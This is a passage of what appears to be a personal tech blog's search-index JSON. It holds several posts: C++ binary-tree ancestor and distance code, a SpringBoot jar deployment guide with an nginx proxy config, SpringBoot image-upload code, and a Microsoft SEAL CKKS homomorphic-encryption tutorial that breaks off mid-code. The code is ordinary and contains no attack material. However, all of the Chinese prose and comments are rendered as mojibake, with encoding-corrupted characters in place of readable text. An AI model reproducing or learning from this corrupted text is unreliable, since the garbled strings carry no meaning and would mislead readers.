return T; // è¯´æ˜åœ¨æŸå·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹ BiTree left = lowAnc(T->lson,A,B); BiTree right = lowAnc(T->rson,A,B); if( left != NULL &amp;&amp; right != NULL) // å½“åœ¨å·¦å­æ ‘å’Œå³å­æ ‘ä¸­éƒ½æ‰¾åˆ°A,B è¯´æ˜æ˜¯æœ€è¿‘çš„å…¬å…±ç¥–å…ˆ return T; return !left ? right:left; //å¯¹ä¸€ä¸ªåº•å±‚å‘ä¸Šæ›´æ–°çš„æ ¹ç»“ç‚¹æ¥è¯´ï¼Œåªåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘æ‰¾åˆ°äº†ç›®æ ‡ç»“ç‚¹ï¼Œåˆ™è¿”å›æ‰¾åˆ°çš„ç»“ç‚¹ã€‚ &#125; /** * [æ±‚æœ€è¿‘å…¬å…±ç¥–å…ˆåˆ°ç›®æ ‡pçš„è·ç¦»] * @param T [description] * @param p [description] * @return [description] */ int CalDistance(BiTree T,BiTree p)&#123; if( !T ) return -1; if( T == p) return 0; // å…ˆåœ¨å·¦å­æ ‘æ‰¾ int res = CalDistance(T->lson,p); // å¦‚æœæœªæ‰¾åˆ°,åœ¨å³å­æ ‘ä¸­æ‰¾ if( res == -1) res = CalDistance(T->rson,p); // æ‰¾åˆ°, è·ç¦»+1 if( res != -1) return res + 1; // å¦‚æœå¸¦æƒå€¼, è¿™é‡Œæ”¹æˆ+æƒå€¼ return -1; &#125; /** * [æ±‚æ ‘ä¸­A-Bçš„è·ç¦»] * @param T [description] * @param A [description] * @param B [description] * @return [description] */ int Dis_A_B(BiTree T,BiTree A,BiTree B)&#123; //æ‰¾åˆ°æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹ BiTree lowanc = lowAnc(T,A,B); // æ±‚æœ€è¿‘æœ€è¿‘å…¬å…±ç¥–å…ˆç»“ç‚¹åˆ°ä¸¤ç›®æ ‡ç»“ç‚¹çš„è·ç¦»ä¹‹å’Œ return CalDistance(lowanc,A) + CalDistance(lowanc,B); &#125; 20++) æ‰¾å‡ºäºŒå‰æ ‘ä¸­æŸä¸ªç»“ç‚¹çš„æ‰€æœ‰ç¥–å…ˆç»“ç‚¹ code ++/** * æ‰¾å‡ºäºŒå‰æ ‘ä¸­æŸä¸ªç»“ç‚¹çš„æ‰€æœ‰ç¥–å…ˆç»“ç‚¹ * @param T [description] * @param A [description] * @return [description] */ int FindAllAnc(BiTree T, BiTree A)&#123; // æœªæ‰¾åˆ° if( !T ) return 0; // æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹ if( T == A) return 1; // å¦‚æœåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°è¾“å‡ºæ­¤ç¥–å…ˆç»“ç‚¹ if( FindAllAnc(T->lson,A) || FindAllAnc(T->rson,A) ) &#123; // æˆ–è€…å…¶ä»–æ“ä½œ cout&lt;&lt;T->data&lt;&lt;endl; return 1; &#125; return 0; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç®—æ³•","slug":"æŠ€æœ¯å‘/ç®—æ³•","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.sizaif.com/tags/%E7%AE%97%E6%B3%95/"}],"author":"sizaif"},{"title":"SpringBooté¡¹ç›®æ‰“åŒ…å¹¶å‘å¸ƒåˆ°linuxçº¿ä¸Šè¯¦ç»†è®°å½•å…¨è¿‡ç¨‹,è¯¦ç»†!","slug":"SpringBooté¡¹ç›®æ‰“åŒ…å¹¶å‘å¸ƒåˆ°linuxçº¿ä¸Šè¯¦ç»†è®°å½•å…¨è¿‡ç¨‹-è¯¦ç»†","date":"2021-08-11T14:01:46.000Z","updated":"2021-09-19T10:13:00.745Z","comments":true,"path":"posts/48019f05/","link":"","permalink":"https://www.sizaif.com/posts/48019f05/","excerpt":"","text":"@auther by sizaif @TOC å‰æœŸå‡†å¤‡ ä¸€å°çº¿ä¸ŠlinuxæœåŠ¡å™¨.é˜¿é‡Œäº‘,è…¾è®¯äº‘,åä¸ºäº‘æˆ–è€…å›½å¤–çš„vpséƒ½å¯ä»¥ sshå·¥å…·,åƒxshell,putty sftpä¼ è¾“å·¥å…·,åƒfilezilla. ä¼ è¾“jaråŒ…æ–‡ä»¶ java jdk linux å®‰è£…åŒ…, å®˜ç½‘å³å¯ä¸‹è½½ ä½¿ç”¨Mavenæ‰“åŒ…é¡¹ç›® å¤„ç†é™æ€æ–‡ä»¶ä»¥åŠç«¯å£å· å¦‚æœå¼•å…¥äº†å¤–éƒ¨æ–‡ä»¶,åƒuploadä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½, éœ€è¦è®¾ç½®ç›®å½•ä¸ºlinuxç›®å½• ä¸€èˆ¬åœ¨windowsä¸Šå¼€å‘,windowså’Œlinuxä¸ä¸€æ · application.ymlé…ç½® MVCconfig å†™ä¸ªjava iimplements WebMvcConfigurer // æ¥å…¥è™šæ‹Ÿè·¯å¾„ï¼ˆè§£å†³é‡å¯æœåŠ¡å™¨æ‰æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜ï¼‰ // æ‹¦æˆªæœ¬åœ°è·¯å¾„ @Value(\"$&#123;web.upload-path&#125;\") private String path; @Override public void addResourceHandlers(ResourceHandlerRegistry registry)&#123; // addResourceHandler: ï¼ˆ å­˜å‚¨å›¾ç‰‡çš„è™šæ‹Ÿè·¯å¾„ï¼Œåœ¨ static ç›®å½•ä¸‹çš„ picture æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜å‚¨ä¸Šä¼ å›¾ç‰‡ï¼‰ // addResourceLocations: ï¼ˆ file: + å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼‰ registry.addResourceHandler(\"/images/**\").addResourceLocations(\"file:\"+path); &#125; æ‰“åŒ… æ­¥éª¤: å¿½ç•¥æ‰testæµ‹è¯•,é˜²æ­¢å‘å¸ƒåˆ°çº¿ä¸Šå‡ºç°å„ç§é—®é¢˜ æˆåŠŸåä¼šåœ¨targetç›®å½•ä¸‹ç”Ÿæˆ ç‰ˆæœ¬å·ä¸pom.xml ä¸­versionæœ‰å…³ å®‰è£…JDK å‚è€ƒæ–‡ç« : linuxå®‰è£…java1.8 jdkå¹¶é…ç½®ç¯å¢ƒå˜é‡ åƒé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘éœ€è¦é…ç½®å®‰å…¨ç»„, å‚è€ƒè¿æ¥:é˜¿é‡Œäº‘å®‰å…¨ç»„é…ç½®æ–¹æ³• å°†jaråŒ…ä¼ è¾“åˆ°linuxæœåŠ¡å™¨ä¸Š javaè¿è¡ŒjaråŒ… ä¸ºäº†æ–¹ä¾¿,å†™ä¸€ä¸ªstart.shè„šæœ¬ æ–¹ä¾¿æ—¥åæ›´æ–°ç‰ˆæœ¬æ‰§è¡Œ vim start.sh nohup java -jar emsdemo-0.1.8-SNAPSHOT.jar >springboot.log 2>&amp;1 &amp; chmod +x start.sh è¿è¡Œ å¹¶æŸ¥çœ‹è¿è¡Œæ—¥å¿— ./start.sh cat springboot.log ç„¶ååœ¨æµè§ˆå™¨è¾“å…¥ä½ çš„ip:ç«¯å£å·å°±å¯ä»¥è®¿é—®äº† é¢å¤–:ä½¿ç”¨åŸŸåè®¿é—® å¦‚æœæˆ‘æƒ³é€šè¿‡åŸŸåç›´æ¥è®¿é—®é¡¹ç›®,ä¸æƒ³ç”¨ip+ ç«¯å£å·çš„æ–¹å¼ ==å›½å†…çš„æœåŠ¡å™¨åŸŸåç»‘å®šéœ€è¦å¤‡æ¡ˆ,å›½å¤–ä¸ç”¨== æ€è·¯: ==é»˜è®¤åŸŸåç»‘å®š80ç«¯å£,æ‰€ä»¥ä½¿ç”¨nginx ç«¯å£è½¬å‘åŠŸèƒ½== å®‰è£…nginx å¦‚æœä¸æƒ³æ‰‹åŠ¨å®‰è£…,å®‰è£…å®å¡”,ç”¨å®å¡”å®‰è£…å’Œé…ç½® å®å¡”å®‰è£…:linuxå®‰è£…å®å¡” é…ç½®nginx server &#123; listen 80; #server_name phpmyadmin; #index index.html index.htm index.php; #root &#x2F;www&#x2F;server&#x2F;phpmyadmin; #error_page 404 &#x2F;404.html; #include enable-php.conf; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;sizaif.com:8080; &#125; &#125; ç„¶årelod nginx è¿‡ä¸€ä¼šé€šè¿‡åŸŸåå°±å¯ä»¥è®¿é—®äº† æ•ˆæœ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"},{"name":"Springboot","slug":"æŠ€æœ¯å‘/Springboot","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Springboot/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Springboot","slug":"Springboot","permalink":"https://www.sizaif.com/tags/Springboot/"}],"author":"sizaif"},{"title":"SpringBooté¡¹ç›®å›¾ç‰‡æ–‡ä»¶çš„ä¸Šä¼ ä¸æ˜¾ç¤º","slug":"SpringBooté¡¹ç›®å›¾ç‰‡æ–‡ä»¶çš„ä¸Šä¼ ä¸æ˜¾ç¤º","date":"2021-08-11T14:01:44.000Z","updated":"2021-09-19T10:12:51.828Z","comments":true,"path":"posts/38a7ff2/","link":"","permalink":"https://www.sizaif.com/posts/38a7ff2/","excerpt":"","text":"@auther by sizaif éœ€æ±‚åˆ†æ åœ¨ä¸ªäººä¿¡æ¯é¡µé¢ç‚¹å‡»å›¾ç‰‡ä¸Šä¼ ,ä¸Šä¼ æ–‡ä»¶åˆ°åå°å,å¹¶ä¿®æ”¹å›¾ç‰‡çš„åç§°,è®¾ç½®ä¸º å”¯ä¸€çš„åç§°,å¹¶åŒæ­¥è·Ÿæ–°å›¾ç‰‡åç§°åˆ°æ•°æ®åº“ä¸­ æ•°æ®åº“è®¾è®¡ æˆ‘çš„æ•°æ®åº“ä¸­: Userså­˜æ”¾ç”¨æˆ·åå’Œå¯†ç , Member å­˜æ”¾ç”¨æˆ·è¯¦ç»†ä¿¡æ¯(åŒ…æ‹¬å›¾ç‰‡) é…ç½®application.yml è®¾ç½®è‡ªå®šä¹‰çš„æ–‡ä»¶ä¸Šä¼ ç›®å½•: # è‡ªå®šä¹‰æ–‡ä»¶ä¸Šä¼ è·¯å¾„ web: # Linux # upload-path: /root/emsdemo/image # Windows 10 upload-path: C:/Users/SIZ/Desktop/bishe/image/ åå°ä»£ç  æ§åˆ¶ä»£ç  code @Value(\"$&#123;web.upload-path&#125;\") private String path; @PostMapping(\"/users/doUpload/&#123;uid&#125;\") public String UploadImage(@PathVariable(\"uid\") Integer id,@RequestParam(\"imgfile\")MultipartFile file,HttpServletRequest httpServletRequest)&#123; /** * header_img_urlæ˜¯ä»æ•°æ®åº“é‡Œæçš„ï¼Œè¦å’Œä½ æœ¬åœ°æˆ–è€…çº¿ä¸Šçš„ä¸“é—¨æ”¾å›¾ç‰‡çš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶å»åŒ¹é…ï¼Œ * å¦‚æœä¸€å¼€å§‹æˆ‘æäº†æ•°æ®åº“çš„å¤´åƒï¼Œå‘ç°è¿™ä¸ªå·²ç»å­˜åœ¨æ–‡ä»¶å¤¹é‡Œäº†ï¼Œé‚£æˆ‘éœ€è¦æ¢å¤´åƒçš„æ—¶å€™ï¼Œ * å°±éœ€è¦æ‰¾æ–‡ä»¶å¤¹é‡Œæœ‰æ²¡æœ‰å’Œè¿™ä¸€æ¨¡ä¸€æ ·çš„æ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾æ˜¯æœ‰çš„ï¼Œå› ä¸ºä¸ç®¡æ¢ä¸æ¢å¤´åƒä¹‹å‰ï¼Œ * æˆ‘è¿™ä¸ªå¤´åƒä¸€å®šæ˜¯ä¿å­˜åœ¨æ•°æ®åº“å­—æ®µé‡Œé¢ï¼Œå¹¶ä¸”ä¹Ÿåœ¨æ–‡ä»¶å¤¹é‡Œé¢ï¼Œæ­¤æ—¶æˆ‘è¦æ›´æ¢å¤´åƒäº†ï¼Œ * é‚£æˆ‘è‚¯å®šè¦æŠŠæ–‡ä»¶çš„è¿™ä¸ªå¤´åƒæ–‡ä»¶åˆ æ‰å¹¶æŠŠæ–°ä¸Šä¼ çš„å¤´åƒæ–‡ä»¶åŠ è¿›æ¥ï¼Œä¸å­˜å†å²è®°å½•ï¼Œ * é˜²æ­¢è¶Šæ¥è¶Šå¤šçš„å¤´åƒå å†…å­˜ï¼Œå¹¶ä¸”ï¼Œæˆ‘è¦æŠŠè¿™æ¡è®°å½•æ’åˆ°æ•°æ®åº“é‡Œé¢ï¼Œï¼Œç›¸å½“äºæ›´æ–°äº†å¤´åƒã€‚ */ // è·å–å½“å‰ç”¨æˆ· Subject currentUser = SecurityUtils.getSubject(); Users curru = (Users) currentUser.getPrincipal(); System.out.println(\"currenttUser.ID--> \" + curru.getId()); /** * æ ¹æ®User.id æ‹¿åˆ°member å…¨éƒ¨ä¿¡æ¯ */ Member member = memberService.QueryOneMemberInfoByID(curru.getId()); /** * è·å–æ•°æ®åº“ä¸­å½“å‰ç”¨æˆ·çš„ç…§ç‰‡ * è‹¥å­˜åœ¨åˆ™åˆ é™¤,æ›¿æ¢ */ File sqlfile = new File(member.getImage()); Boolean isExits = sqlfile.exists(); if(isExits)&#123; sqlfile.delete(); &#125; //å¾—åˆ°å°†è¦ä¸Šä¼ çš„æ–‡ä»¶å String fileName = file.getOriginalFilename(); //è®¾ç½®æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”è®¾ç½®äº†æ–°çš„å”¯ä¸€åå­—XXXXX.jpg String newFileName = FileUtils.upload(file, path, fileName); /** * è¿æ¥æ•°æ®åº“è¿›è¡Œè¿›è¡Œæ›´æ–° */ HashMap&lt;String, Object> memberMap = new HashMap&lt;>(); memberMap.put(\"image\",newFileName); memberMap.put(\"id\",id); SystemResult systemResult = memberService.UpdateMemberInfo(memberMap); if(systemResult.getStatus()!=200)&#123; // å¤±è´¥ System.out.println(systemResult.getMsg()); &#125;else &#123; // æˆåŠŸ /** * æ›´æ–°åˆ°IndexDto ä¸­ */ Member afterUpdateImageMember = memberService.QueryOneMemberInfoByID(curru.getId()); IndexDto indexDto = new IndexDto(); UsersServiceAppoint.WriteUsersInfoToDto(indexDto,curru,afterUpdateImageMember); Session session = currentUser.getSession(); HttpSession httpSession = httpServletRequest.getSession(); httpSession.setAttribute(\"IndexDto\",indexDto); session.setAttribute(\"IndexDto\",indexDto); System.out.println(\"è¿›è¡Œäº†å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½,å¹¶æ›´æ–°åˆ°æ•°æ®åº“\"); System.out.println(systemResult.getMsg()); &#125; /** * é‡å®šå‘åˆ°--->ä¸ªäººä¿¡æ¯é¡µé¢ */ return \"redirect:/users/toProfilesPage/\"+ id; &#125; &#125; FileUtilsä»£ç  code package com.sizaif.emsdemo.utils; import org.springframework.web.multipart.MultipartFile; import java.io.File; import java.io.IOException; import java.util.UUID; public class FileUtils &#123; /** * å”¯ä¸€è¯†åˆ«çš„UUID * @return */ public static String getUUID()&#123; return UUID.randomUUID().toString().replace(\"-\", \"\"); &#125; /** * è·å–æ–‡ä»¶åç¼€ * @param fileName * @return */ public static String getSuffix(String fileName)&#123; return fileName.substring(fileName.lastIndexOf(\".\")); &#125; /** * å’Œéšæœºçš„UUIDç”Ÿæˆæ–°çš„æ–‡ä»¶å * @param fileOriginName * @return */ public static String getFileName(String fileOriginName)&#123; return getUUID() + getSuffix(fileOriginName); &#125; /** * ä¿å­˜æ–‡ä»¶åˆ°æœ¬åœ°,å¹¶è¿”å›æ–°çš„å”¯ä¸€æ–‡ä»¶å * @param file æ–‡ä»¶ * @param path æ–‡ä»¶å­˜æ”¾è·¯å¾„ * @param fileName æ–‡ä»¶åå­— * @return */ public static String upload(MultipartFile file, String path, String fileName)&#123; String newFileName = getFileName(fileName); // ç”Ÿæˆæ–°çš„æ–‡ä»¶å String realPath = path + \"/\" + newFileName; File dest = new File(realPath); //åˆ¤æ–­æ–‡ä»¶çˆ¶ç›®å½•æ˜¯å¦å­˜åœ¨ if(!dest.getParentFile().exists())&#123; dest.getParentFile().mkdir(); &#125; try &#123; //ä¿å­˜æ–‡ä»¶ file.transferTo(dest); return newFileName; &#125; catch (IOException e) &#123; e.printStackTrace(); return null; &#125; &#125; &#125; MVCConfigè®¾ç½® code æ–°å»ºMyMvcConfig.java @Configuration @Component public class MyMvcConfig implements WebMvcConfigurer &#123; // æ¥å…¥è™šæ‹Ÿè·¯å¾„ï¼ˆè§£å†³é‡å¯æœåŠ¡å™¨æ‰æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜ï¼‰ // æ‹¦æˆªæœ¬åœ°è·¯å¾„ // å‰ç«¯ä»£ç åªéœ€è¦è®¾ç½®æˆåˆ°/images/ç›®å½•ä¸‹æ‹¿å›¾ç‰‡, // ä¾¿å¯ä»¥è‡ªåŠ¨åˆ°è‡ªå·±è®¾ç½®çš„pathç›®å½•ä¸‹æ‹¿å›¾ç‰‡ @Value(\"$&#123;web.upload-path&#125;\") private String path; @Override public void addResourceHandlers(ResourceHandlerRegistry registry)&#123; // addResourceHandler: ï¼ˆ å­˜å‚¨å›¾ç‰‡çš„è™šæ‹Ÿè·¯å¾„ï¼Œåœ¨ static ç›®å½•ä¸‹çš„ picture æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜å‚¨ä¸Šä¼ å›¾ç‰‡ï¼‰ // addResourceLocations: ï¼ˆ file: + å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼‰ registry.addResourceHandler(\"/images/**\").addResourceLocations(\"file:\" +path ); &#125; &#125; å‰ç«¯ä»£ç  ä¸Šä¼ ä»£ç  &lt;form enctype=\"multipart/form-data\" method=\"post\" th:action=\"@&#123;/users/doUpload/&#125; + $&#123;ProfilesInfo.getId()&#125;\"> &lt;input class=\"btn btn-success \" name=\"imgfile\" type=\"file\">&lt;i class=\"fa fa-image m-right-xs\">&lt;/i>ä¿®æ”¹ç…§ç‰‡&lt;/input> &lt;input type=\"submit\" class=\"tn btn-success\" value=\"ä¸Šä¼ \"> &lt;/form> æ˜¾ç¤ºä»£ç  ${ProfilesInfo.getImage()} æ‹¿åˆ°çš„æ˜¯æ•°æ®åº“ä¸­å›¾ç‰‡çš„åå­— &lt;img class=\"img-responsive avatar-view\" th:src=\"@&#123;/images/&#125;+$&#123;ProfilesInfo.getImage()&#125;\" alt=\"Avatar\" title=\"Change the avatar\" onclick=\"F_Open_dialog()\">","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"},{"name":"Springboot","slug":"æŠ€æœ¯å‘/Springboot","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Springboot/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Springboot","slug":"Springboot","permalink":"https://www.sizaif.com/tags/Springboot/"}],"author":"sizaif"},{"title":"SEALå­¦ä¹ ç¬¬å››å¤©-Ckks_basics","slug":"SEALå­¦ä¹ ç¬¬å››å¤©-ckks-basics","date":"2021-08-11T14:01:42.000Z","updated":"2021-08-14T14:15:24.769Z","comments":true,"path":"posts/51f3b771/","link":"","permalink":"https://www.sizaif.com/posts/51f3b771/","excerpt":"","text":"@auther by sizaif SEAL å­¦ä¹ ç¬¬å››å¤©ï¼š ckks_basics @[toc] ç®€ä»‹è¯´æ˜ é€šå¸¸ä¸€ä¸ªå¥½çš„ç­–ç•¥æ˜¯ä¸ºCKKSé€‰æ‹©å‚æ•°æ–¹æ¡ˆå¦‚ä¸‹: (1) é€‰æ‹©ä¸€ä¸ª60ä½ç´ æ•°ä½œä¸ºcoeff_modulusä¸­çš„ç¬¬ä¸€ä¸ªç´ æ•°.è¿™å°†è§£å¯†æ—¶ç»™å‡ºæœ€é«˜çš„ç²¾åº¦; (2) é€‰æ‹©å¦ä¸€ä¸ª60ä½ç´ æ•°ä½œä¸ºcoeff_modulusçš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œ,åŒæ—¶è¿™å°†è¢«ç”¨ä½œç‰¹æ®Šçš„ç´ æ•°ï¼Œåº”è¯¥ä¸å…¶ä»–è´¨æ•°ä¸­æœ€å¤§çš„ä¸€æ ·æ‰“ï¼› (3) é€‰æ‹©ä¸­é—´ç´ æ•°å½¼æ­¤æ¥è¿‘ æˆ‘ä»¬ä½¿ç”¨CoeffModulus::Createæ¥ç”Ÿæˆé€‚å½“å¤§å°çš„ç´ æ•°ã€‚è¯·æ³¨æ„æˆ‘ä»¬çš„coeff_modulusæ˜¯200ä½çš„æ€»å’Œï¼Œè¿™ä½äº poly_modulus_degree: CoeffModulus::MaxBitCount(8192)è¿”å›218ã€‚ scale æ¯”ä¾‹å¢å¤§è¾“å…¥çš„æµ®ç‚¹ç³»æ•°æ•°æ® å³ä½¿åœ¨çº¯æ–‡æœ¬å…ƒç´ çš„CKKSæ–¹æ¡ˆåŸºæœ¬ä¸Šæ˜¯å¤šé¡¹å¼çš„æ•´æ•°ç³»æ•° x^n ç¼–ç çš„ä½ç²¾åº¦;è‡ªç„¶ä¼šå½±å“ç²¾åº¦ç»“æœã€‚ æ‰€ä»¥è®¾ç½®ä¸€ä¸ªæ”¾å¤§æ¯”ä¾‹ç³»æ•°æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚ æœ‰äº†scale å¿…ç„¶æœ‰rescale rescale é€šå¸¸åœ¨ä¹˜æ³•åæ‰§è¡Œ ç›®çš„: ä¹˜æ³•åï¼š scale = scale + scale = 2*scale å³ $ \\Delta^{2}\\to \\Delta $ å‡½æ•°è°ƒç”¨ å‚æ•°ç±»å‹ è§£é‡Šè¯´æ˜ evaluator.rescale_to_next_inplace(Ciphertext) Ciphertext é‡æ–°è°ƒæ•´scaleæ¯”ä¾‹ç³»æ•°æ¥è¿‘äºåˆå§‹è®¾ç½®çš„å€¼ï¼Œæ¥è¿‘ä½†ä¸æ˜¯ç­‰äº double scale = pow(2.0, 40); int å®šä¹‰ä¸€ä¸ª2^40 çš„scale æ¯”ä¾‹ç³»æ•° Encoding &amp; Decoding è®¡ç®— å¯¹äºå¤šé¡¹å¼ ä¸åŒçš„è®¡ç®—é¡ºåºæ¶ˆè€—çš„å™ªå£°é¢„ç®—ä»¥åŠæ€§èƒ½ä¸åŒ åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­: æ±‚ $F(x) = \\pi * x^{3} + 0.4 * x +1$ Plaintext plain_coeff3, plain_coeff1, plain_coeff0; // ç¼–ç  encoder.encode(3.14159265, scale, plain_coeff3);// PI encoder.encode(0.4, scale, plain_coeff1); // 0.4 encoder.encode(1.0, scale, plain_coeff0); // 1 // x^2 evaluator.square(x1_encrypted, x3_encrypted); // x3_encrypted = x1_encrypted * x1_encrypted evaluator.relinearize_inplace(x3_encrypted, relin_keys); evaluator.rescale_to_next_inplace(x3_encrypted); // é‡æ–°è°ƒæ•´scale è§„æ¨¡ // PI * x evaluator.multiply_plain(x1_encrypted, plain_coeff3, x1_encrypted_coeff3);// x1_encrypted_coeff3 = x1_encrypted * plain_coeff3 evaluator.rescale_to_next_inplace(x1_encrypted_coeff3); // 0.4*x evaluator.multiply_plain_inplace(x1_encrypted, plain_coeff1); evaluator.rescale_to_next_inplace(x1_encrypted); ç„¶åå°±å¯ä»¥ä¸‰é¡¹ä¹‹å’Œï¼›ç„¶è€Œ,æœ‰ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜æ˜¯: â€‹ è¿™ä¸‰ä¸ªæœ¯è¯­ä½¿ç”¨çš„åŠ å¯†å‚æ•°éƒ½æ˜¯ä¸åŒæ˜¯ç”±äºæ¨¡æ•°ä»ç¼©æ”¾è½¬æ¢è€Œæ¥ã€‚ â€‹ è€ŒåŠ å¯†çš„åŠ æ³•å’Œå‡æ³•è¦æ±‚è¾“å…¥çš„levelä¸ºç›¸åŒå¹¶ä¸”åŠ å¯†å‚æ•°(parms_id)åŒ¹é…ã€‚ â€‹ å¦‚æœæœ‰ä¸åŒ¹é…æ—¶ï¼Œæ±‚å€¼å™¨å°†æŠ›å‡ºå¼‚å¸¸ã€‚ æˆ‘ä»¬éªŒè¯å¯ä»¥å‘ç°ä¸‰è€…çš„levelæ˜¯ä¸ä¸€æ ·çš„ åœ¨è¿™ä¸ªæ ·ä¾‹ä¸­ levelçš„å˜åŒ–è¿‡ç¨‹ - Product x^2 has scale 2^80 and is at level 2; - Product PI*x has scale 2^80 and is at level 2; - We rescaled both down to scale 2^80/P_2 and level 1; - Product PI*x^3 has scale (2^80/P_2)^2; - We rescaled it down to scale (2^80/P_2)^2/P_1 and level 0; - Product 0.4*x has scale 2^80; - We rescaled it down to scale 2^80/P_2 and level 1; - The contant term 1 has scale 2^40 and is at level 2. ä¸‰è€…çš„scale è™½ç„¶æ¥è¿‘ï¼Œä½†ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•æ¥è§£å†³è¿™ä¸ªscaleé—®é¢˜ æ—¢ç„¶P_2å’ŒP_1éå¸¸æ¥è¿‘2 ^ 40,æˆ‘ä»¬å¯ä»¥ç®€å•æ¬ºéª— Microsoft SEALï¼ŒæŠŠscale è®¾ç½®æˆä¸€æ ·çš„ï¼Œå› ä¸ºä»¥åŠéå¸¸æ¥è¿‘2^40 // é‡æ–°è®¾ç½®ä¸¤è€…çš„scale x3_encrypted.scale() = pow(2.0, 40); x1_encrypted.scale() = pow(2.0, 40); å¦ä¸€ç§æ–¹æ³•å°±æ˜¯å°†1 ç¼–ç æˆ 2^80/P_2 åœ¨åšä¸€ä¸ª multiply_plain å°†levelé™åˆ°ä¸0.4*x ä¿æŒä¸€è‡´ è§£å†³æ‰ä¸Šé¢çš„é—®é¢˜åæˆ‘ä»¬è¿˜æœ‰åŠ å¯†å‚æ•°ä¸åŒ¹é…çš„é—®é¢˜ã€‚è¿™æ˜¯å¾ˆå®¹æ˜“çš„é€šè¿‡ä½¿ç”¨modulus switching (no rescaling) æ¥è§£å†³ CKKSæ”¯æŒmodulus switchingå°±åƒBFVæ ¼å¼ä¸€æ ·ã€ cout &lt;&lt; \"Normalize encryption parameters to the lowest level.\" &lt;&lt; endl; parms_id_type last_parms_id = x3_encrypted.parms_id(); evaluator.mod_switch_to_inplace(x1_encrypted, last_parms_id); evaluator.mod_switch_to_inplace(plain_coeff0, last_parms_id); åˆ°ç°åœ¨è¿™ä¸‰ç§å¯†æ–‡ç°åœ¨éƒ½æ˜¯å…¼å®¹çš„ï¼Œå¯ä»¥è¿›è¡Œaddè¿ç®—äº† cout &lt;&lt; \"Compute PI*x^3 + 0.4*x + 1.\" &lt;&lt; endl; Ciphertext encrypted_result; evaluator.add(x3_encrypted, x1_encrypted, encrypted_result); evaluator.add_plain_inplace(encrypted_result, plain_coeff0); ç»“æœéªŒè¯: è¾“å‡ºä¸€ä¸ªçœŸçš„ï¼Œç„¶åå°†åŠ å¯†çš„è§£å¯†è§£ç ï¼Œåšå¯¹æ¯”éªŒè¯ code Plaintext plain_result; print_line(__LINE__); cout &lt;&lt; \"Decrypt and decode PI*x^3 + 0.4x + 1.\" &lt;&lt; endl; cout &lt;&lt; \" + Expected result:\" &lt;&lt; endl; vector&lt;double> true_result; for (size_t i = 0; i &lt; input.size(); i++) &#123; double x = input[i]; true_result.push_back((3.14159265 * x * x + 0.4) * x + 1); &#125; print_vector(true_result, 3, 7); /* Decrypt, decode, and print the result. */ decryptor.decrypt(encrypted_result, plain_result); vector&lt;double> result; encoder.decode(plain_result, result); cout &lt;&lt; \" + Computed result ...... Correct.\" &lt;&lt; endl; print_vector(result, 3, 7); æºä»£ç  code #include &quot;examples.h&quot; using namespace std; using namespace seal; void example_ckks_basics() &#123; print_example_banner(&quot;Example: CKKS Basics&quot;); &#x2F;* In this example we demonstrate evaluating a polynomial function PI*x^3 + 0.4*x + 1 on encrypted floating-point input data x for a set of 4096 equidistant points in the interval [0, 1]. This example demonstrates many of the main features of the CKKS scheme, but also the challenges in using it. We start by setting up the CKKS scheme. *&#x2F; EncryptionParameters parms(scheme_type::ckks); size_t poly_modulus_degree &#x3D; 8192; &#x2F;&#x2F;long long unsigned int parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 60, 40, 40, 60 &#125;)); &#x2F;* * æˆ‘ä»¬é€‰æ‹©åˆå§‹æ¯”ä¾‹ä¸º2^40 